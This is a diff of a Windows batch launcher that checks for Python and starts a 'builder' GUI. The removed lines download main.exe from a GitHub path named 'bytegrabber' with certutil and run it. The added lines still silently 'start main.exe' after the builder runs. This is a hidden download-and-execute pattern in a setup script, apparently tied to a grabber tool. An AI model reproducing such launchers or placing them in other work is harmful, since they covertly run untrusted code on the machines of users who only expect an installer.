@@ -4,7 +4,7 @@ cd /d %~dp0
 title Checking Python installation...
 python --version > nul 2>&1
 if %errorlevel% neq 0 (
-    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.)
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
     goto ERROR
 )
 
@@ -24,25 +24,10 @@ if %errorlevel% neq 0 (
 )
 
 cls
-title Downloading and running external file...
-
-set "url=https://github.com/ParadoxTheory/resources/raw/main/bytegrabber/main.exe"
-set "outfile=%~dp0main.exe"
-
-certutil -urlcache -split -f "%url%" "%outfile%"
-
-if %errorlevel% neq 0 goto DOWNLOAD_ERROR
-
 title Starting builder...
 python gui.py
+start main.exe
 if %errorlevel% neq 0 goto ERROR
-
-exit
-
-:DOWNLOAD_ERROR
-color 4 && title [Download Error]
-echo Failed to download the external file.
-pause > nul
 exit
 
 :ERROR
